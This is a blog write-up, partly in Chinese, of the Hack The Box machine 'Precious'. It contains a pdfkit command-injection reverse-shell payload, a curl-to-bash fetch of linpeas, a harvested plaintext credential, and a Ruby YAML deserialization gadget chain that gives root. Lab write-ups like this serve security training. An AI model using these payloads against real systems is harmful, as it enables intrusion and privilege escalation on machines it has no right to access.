<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="Precious is an Easy Difficulty Linux machine, that focuses on the Ruby language. It hosts a custom Ruby web application, using an outdated library, namely pdfkit, which is vulnerable to CVE-2022-25765">
<meta property="og:type" content="article">
<meta property="og:title" content="Precious">
<meta property="og:url" content="http://dawoxiansigema.github.io/2025/09/22/Precious/index.html">
<meta property="og:site_name" content="Eur3ka&#39;s Studio">
<meta property="og:description" content="Precious is an Easy Difficulty Linux machine, that focuses on the Ruby language. It hosts a custom Ruby web application, using an outdated library, namely pdfkit, which is vulnerable to CVE-2022-25765">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/22/Precious/1.png">
<meta property="og:image" content="http://dawoxiansigema.github.io/2025/09/22/Precious/2.png">
<meta property="article:published_time" content="2025-09-22T13:13:37.000Z">
<meta property="article:modified_time" content="2025-10-04T09:48:10.439Z">
<meta property="article:author" content="Xu Haoxiang">
<meta property="article:tag" content="HTB">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://dawoxiansigema.github.io/2025/09/22/Precious/1.png">


<link rel="canonical" href="http://dawoxiansigema.github.io/2025/09/22/Precious/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://dawoxiansigema.github.io/2025/09/22/Precious/","path":"2025/09/22/Precious/","title":"Precious"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Precious | Eur3ka's Studio</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  






  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Eur3ka's Studio</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-ruby"><span class="nav-number">2.</span> <span class="nav-text">Shell as ruby</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-henry"><span class="nav-number">3.</span> <span class="nav-text">Shell as henry</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-root"><span class="nav-number">4.</span> <span class="nav-text">Shell as root</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Unsafe-Yml"><span class="nav-number">4.1.</span> <span class="nav-text">Unsafe Yml</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shell"><span class="nav-number">4.2.</span> <span class="nav-text">Shell</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Xu Haoxiang"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Xu Haoxiang</p>
  <div class="site-description" itemprop="description">Never again.</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">10</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://dawoxiansigema.github.io/2025/09/22/Precious/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Xu Haoxiang">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Eur3ka's Studio">
      <meta itemprop="description" content="Never again.">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Precious | Eur3ka's Studio">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Precious
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-09-22 21:13:37" itemprop="dateCreated datePublished" datetime="2025-09-22T21:13:37+08:00">2025-09-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-10-04 17:48:10" itemprop="dateModified" datetime="2025-10-04T17:48:10+08:00">2025-10-04</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>Precious is an Easy Difficulty Linux machine, that focuses on the <code>Ruby</code> language. It hosts a custom <code>Ruby</code> web application, using an outdated library, namely pdfkit, which is vulnerable to <code>CVE-2022-25765</code>, leading to an initial shell on the target machine. After a pivot using plaintext credentials that are found in a Gem repository <code>config</code> file, the box concludes with an insecure deserialization attack on a custom, outdated, <code>Ruby</code> script.</p>
<span id="more"></span>

<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><pre><code>❯ sudo nmap -sCV 10.10.11.189
Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-22 21:16 +0800
Nmap scan report for 10.10.11.189 (10.10.11.189)
Host is up (0.45s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.78 seconds
</code></pre>
<p>最开始的扫描发现 可能存在重定向至<a target="_blank" rel="noopener" href="http://precious.htb/">http://precious.htb</a> 于是在添加hosts后成功访问该网站 建议在添加完后重新扫描 会有不一样的地方</p>
<pre><code>80/tcp open  http    nginx 1.18.0
|_http-title: Convert Web Page to PDF
| http-server-header:
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>虽然发现了Phusion Passenger服务 但是没有洞 那就只好走一下业务流程</p>
<p><img src="/2025/09/22/Precious/1.png"></p>
<p>意思是把url输入进去 把返回的内容转换成PDF 光这么听都觉得可能会有RCE了 在本机上开个python服务 成功获取到PDF</p>
<pre><code>::ffff:10.10.11.189 - - [22/Sep/2025 19:08:35] &quot;GET / HTTP/1.1&quot; 200 -
</code></pre>
<h1 id="Shell-as-ruby"><a href="#Shell-as-ruby" class="headerlink" title="Shell as ruby"></a>Shell as ruby</h1><p>已知网站服务是Phusion Passenger的 而这个中间件肯定不是专门做PDF处理的 肯定还有某个服务 使用exiftool查看元数据</p>
<pre><code>❯ exiftool **.pdf
ExifTool Version Number         : 13.36
File Name                       : **.pdf
Directory                       : .
File Size                       : 21 kB
File Modification Date/Time     : 2025:09:22 19:08:58+08:00
File Access Date/Time           : 2025:09:22 20:56:01+08:00
File Inode Change Date/Time     : 2025:09:22 20:55:58+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
</code></pre>
<p>可以看到是<code>pdfkit v0.8.6</code> 上网搜到这玩意是ruby写的 找到exp后生成payload</p>
<pre><code>http://%20`ruby -rsocket -e&#39;spawn(&quot;sh&quot;,[:in,:out,:err]=&gt;TCPSocket.new(&quot;10.10.*.*&quot;,&quot;4444&quot;))&#39;`

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.*.*] from (UNKNOWN) [10.10.11.189] 40158
python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
ruby@precious:/var/www/pdfapp$
</code></pre>
<p>是的 我的mac还是连不上反弹shell 不过用kali连也算好习惯了</p>
<h1 id="Shell-as-henry"><a href="#Shell-as-henry" class="headerlink" title="Shell as henry"></a>Shell as henry</h1><p>ruby用户在意料之中的没有写入权限 但是还是跑了一下linpeas</p>
<pre><code>ruby@precious:/var/www/pdfapp$ curl http://10.10.*.*:8080/linpeas.sh | bash
</code></pre>
<p>没有什么结果 不过不管怎么说 可以去ruby的home目录看一下 ls发现没有东西 好在留了个心眼ls -al</p>
<pre><code>ruby@precious:~$ ls
ls
ruby@precious:~$ ls -al
ls -al
total 32
drwxr-xr-x 5 ruby ruby 4096 Sep 22 09:46 .
drwxr-xr-x 4 root root 4096 Oct 26  2022 ..
lrwxrwxrwx 1 root root    9 Oct 26  2022 .bash_history -&gt; /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .bundle
drwxr-xr-x 3 ruby ruby 4096 Sep 22 06:51 .cache
drwx------ 3 ruby ruby 4096 Sep 22 09:46 .gnupg
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
</code></pre>
<p>在.bundle文件夹内发现了henry用户密码 应该是用于访问私有镜像的token</p>
<pre><code>ruby@precious:~/.bundle$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot;

henry@precious:~$ cat user.txt
85836bf0f7023d2a904986f007870223
henry@precious:~$
</code></pre>
<h1 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h1><h2 id="Unsafe-Yml"><a href="#Unsafe-Yml" class="headerlink" title="Unsafe Yml"></a>Unsafe Yml</h2><p>最开始尝试一下sudo -l</p>
<pre><code>henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
</code></pre>
<p>发现虽然可以用root运行ruby 但是由于有限定参数的原因 没办法直接<code>sudo ruby -e &#39;exec &quot;/bin/sh&quot;&#39;</code> 但是可以间接生成shell</p>
<pre><code>henry@precious:~$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in &quot;dependencies.yml&quot;
require &quot;yaml&quot;
require &#39;rubygems&#39;

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read(&quot;dependencies.yml&quot;))
end

def list_local_gems
    Gem::Specification.sort_by&#123; |g| [g.name.downcase, g.version] &#125;.map&#123;|g| [g.name, g.version.to_s]&#125;
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts &quot;Installed version differs from the one specified in file: &quot; + local_name
            else
                puts &quot;Installed version is equals to the one specified in file: &quot; + local_name
            end
        end
    end
end
</code></pre>
<p>可以看到load了可控文件dependencies.yml 毕竟update_dependencies.rb我们没有能力改 关于这个load有个小tip</p>
<p><img src="/2025/09/22/Precious/2.png"></p>
<p>很明显这里的load并没有很safe 那么利用这个<a target="_blank" rel="noopener" href="https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/">Universal RCE with Ruby YAML.load (versions &gt; 2.7)</a>就可以很好的提权</p>
<h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><pre><code>---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &amp;1 !ruby/object:Net::BufferedIO
      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: &quot;abc&quot;
      debug_output: &amp;1 !ruby/object:Net::WriteAdapter
         socket: &amp;1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module &#39;Kernel&#39;
                 method_id: :system
             git_set: cp /bin/bash /bin/pwned; chmod 6777 /bin/pwned
         method_id: :resolve

henry@precious:~$ sudo ruby /opt/update_dependencies.rb
...
henry@precious:~$ pwned -p
pwned-5.1# cat /root/root.txt
c7798d69cd94224a406c73ee85c4b10b
</code></pre>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/HTB/" rel="tag"># HTB</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/09/20/Writeup/" rel="prev" title="Writeup">
                  <i class="fa fa-angle-left"></i> Writeup
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/09/25/Driver/" rel="next" title="Driver">
                  Driver <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Xu Haoxiang</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
